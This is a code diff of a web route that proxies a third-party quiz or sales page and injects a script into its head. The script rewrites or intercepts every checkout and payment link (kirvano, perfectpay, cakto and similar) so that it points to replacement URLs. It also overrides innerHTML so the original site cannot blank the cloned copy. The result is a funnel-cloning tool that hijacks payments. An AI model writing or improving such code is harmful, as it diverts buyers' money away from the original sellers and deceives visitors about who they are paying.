@@ -27,14 +27,27 @@ export async function GET(req: Request, { params }: { params: Promise<{ id: stri
     });
 
     let html = await response.text();
-    const targetBaseUrl = new URL(quiz.original_url).origin;
+    const targetUrl = new URL(quiz.original_url);
+    const targetBaseUrl = targetUrl.origin;
 
-    // Script de Proteção Nuclear
-    const interceptorScript = `
+    // SCRIPT SAFE-GUARD V7 + ESCUDO NUCLEAR
+    const safetyScript = `
       <script>
       (function() {
         window.QUIZ_REPLACEMENTS = ${JSON.stringify(quiz.theme_config?.replacements || {})};
         
+        // --- PROTEÇÃO ANTI-TELA-BRANCA ---
+        const noop = () => {};
+        // Impedir que o site original limpe o corpo da página
+        const _origSet = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set;
+        Object.defineProperty(Element.prototype, 'innerHTML', {
+          set: function(val) {
+            if (this.tagName === 'BODY' && (val === '' || val === ' ')) return;
+            return _origSet.call(this, val);
+          }
+        });
+
+        // --- ESCUDO NUCLEAR DE CHECKOUT ---
         function forceRedirect(url) {
           if (!url || typeof url !== 'string') return false;
           const replacements = window.QUIZ_REPLACEMENTS || {};
@@ -43,78 +56,59 @@ export async function GET(req: Request, { params }: { params: Promise<{ id: stri
           const final = specific || global;
 
           if (final && (url.includes('kirvano') || url.includes('pay.') || url.includes('checkout') || url.includes('perfectpay') || url.includes('cakto'))) {
-            console.log("God Mode: Bloqueando e redirecionando para " + final);
             window.location.href = final;
             return true;
           }
           return false;
         }
 
-        // 1. Limpeza Ativa de Links (MutationObserver)
-        const observer = new MutationObserver(() => {
-          document.querySelectorAll('a, button').forEach(el => {
-            const href = el.getAttribute('href');
-            if (href && (href.includes('kirvano') || href.includes('pay.') || href.includes('checkout'))) {
-              const replacements = window.QUIZ_REPLACEMENTS || {};
-              const final = replacements[href] || replacements['__CHECKOUT_URL__'];
-              if (final) {
-                el.setAttribute('href', final);
-                el.onclick = (e) => { 
-                  e.preventDefault(); 
-                  e.stopPropagation();
-                  window.location.href = final; 
-                };
-              }
-            }
-          });
-        });
-        observer.observe(document.documentElement, { childList: true, subtree: true });
-
-        // 2. Interceptar window.open
-        const _open = window.open;
-        window.open = function(url) {
-          if (url && forceRedirect(url)) return null;
-          return _open.apply(this, arguments);
-        };
-
-        // 3. Interceptar cliques globais (Capture Phase)
+        // Interceptar Cliques
         document.addEventListener('click', (e) => {
           const target = e.target.closest('a, button, [role="button"]');
           if (target) {
             const href = target.getAttribute('href') || '';
-            const text = target.textContent?.toLowerCase() || '';
-            if (forceRedirect(href) || (text.includes('comprar') && forceRedirect('checkout'))) {
+            if (forceRedirect(href)) {
               e.preventDefault();
               e.stopPropagation();
             }
           }
         }, true);
 
-        // 4. Interceptar Fetch/XHR
-        const _fetch = window.fetch;
-        window.fetch = function(u, c) {
-          const url = typeof u === 'string' ? u : u?.url;
-          if (url && (url.includes('kirvano') || url.includes('checkout'))) {
-            forceRedirect(url);
-            return new Promise(() => {});
-          }
-          return _fetch.apply(this, arguments);
+        // Limpeza Ativa de Links
+        setInterval(() => {
+          document.querySelectorAll('a').forEach(a => {
+            const href = a.getAttribute('href');
+            if (href && (href.includes('kirvano') || href.includes('pay.') || href.includes('checkout'))) {
+              const final = window.QUIZ_REPLACEMENTS[href] || window.QUIZ_REPLACEMENTS['__CHECKOUT_URL__'];
+              if (final) a.setAttribute('href', final);
+            }
+          });
+        }, 500);
+
+        // Bloquear window.open
+        const _open = window.open;
+        window.open = function(url) {
+          if (url && forceRedirect(url)) return null;
+          return _open.apply(this, arguments);
         };
       })();
       </script>
     `;
 
-    // Injetar no topo para prioridade máxima
-    html = html.replace('<head>', '<head>' + interceptorScript);
+    // Injeção Estratégica
+    html = html.replace('<head>', '<head>' + safetyScript);
     
-    // Corrigir caminhos relativos
+    // Corrigir links e imagens para não quebrar
     html = html.replace(/(href|src|action)="\//g, `$1="${targetBaseUrl}/`);
+    
+    // Forçar base para assets relativos
+    html = html.replace('<head>', '<head><base href="' + targetBaseUrl + '/">');
 
     return new Response(html, {
       headers: { 'Content-Type': 'text/html' }
     });
 
   } catch (err) {
-    return new Response('Erro ao carregar o quiz original', { status: 500 });
+    return new Response('Erro ao carregar o quiz', { status: 500 });
   }
 }
